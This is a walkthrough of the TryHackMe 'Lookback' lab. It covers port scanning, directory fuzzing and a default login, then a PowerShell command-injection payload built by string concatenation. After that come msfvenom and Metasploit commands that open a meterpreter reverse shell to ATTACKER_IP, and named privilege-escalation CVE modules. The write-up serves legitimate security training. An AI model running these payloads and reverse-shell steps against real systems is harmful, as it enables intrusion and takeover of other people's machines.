---
title: "THM: Lookback"
date: 2025-12-17 06:00:00 +1000
categories: [TryHackMe, Easy]
tags: [Windows, Command-Injection, Fuzzing, String-Concatenation]
---

![Banner](/assets/Images/Lookback/banner.png)

You’ve been asked to run a vulnerability test on a production environment.

---

## Phase 1: Information Gathering

Standard scanning and enumeration yeilded:
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/https
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-17T00:37:31+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-12-16T00:08:42
|_Not valid after:  2026-06-17T00:08:42
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
Aggressive OS guesses: Windows Server 2019 (92%)

```
Checking the website shows a standard login form, nothing of use in the source and doesnt seem vulnerable to SQLi.

---

## Phase 2: Enumeration

SSL is on so fuzz the URL using HTTPS
```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u https://10.49.191.105/FUZZ -fw 1

```
**FOUND:** /test

---

## Phase 3: Exploitation

Navigating to /test, we're met with a login page:
![Test Login](/assets/Images/Lookback/test-login.png)

On first try we test admin:admin and get access to the first flag:
![FLAG1](/assets/Images/Lookback/flag1.png)

Testing whoami in the user input field shows how the program executes commands:
![Commands](/assets/Images/Lookback/com-exe.png)

Heres how your input is getting wrapped
```powershell
Get-Content('C:\' + $userInput + ')')
```

We must do 3 things in one command to gain RCE:
1. Close string and function call
2. Enter your command seperated on both sides with semi colons.
3. Comment out the rest of the syntax.

Insert command to test:
```powershell
') ; whoami ; #
```

![RCE](/assets/Images/Lookback/rce.png)

Perfect. Heres how that would look on the back end:
```powershell
Get-Content('C:\') ; whoami ; #')
```

What we just did is called "Command injection through string concatenation". I'll break it down abit further:
```
')	Closes the string and function call
; 	Chains a new command
# 	Comments out the leftover syntax
```

---

# Phase 4: Post Exploitation

Lets get a meterpreter shell:
```bash
# Start up and configure your multi/handler:
set LHOST ATTACKER_IP
set LPORT 1234
set PAYLOAD windows/x64/meterpreter/reverse_tcp 
run
``` 

Generate your meterpreter reverse shell payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f psh-cmd

# Copy everything from "powershell.exe" onward and paste/execute in your command injection field.
```
**METERPRETER SESSION WOOHOO!**
not out of the woods yet

---

# Phase 5: Privilege Escalation

- Now background your session and use multi/recon/local_exploit_suggester
- Set your session and run it.

3 exploits immediatly caught my eye due to the windows build itself being vulnerable:
```
1. exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
2. exploit/windows/local/cve_2020_17136
3. exploit/windows/local/cve_2021_40449
```

3rd time's the charm.
![cve_2021_40449](/assets/Images/Lookback/cve.png)


Grab your well deserved **ROOT FLAG!**
```powershell
# Drop into a shell

type C:\Users\Administrator\Documents\flag.txt
```
---

Thats all folks!


**Room:** Lookback | **Platform:** TryHackMe | **Difficulty:** Easy | **Focus:** Command Injection









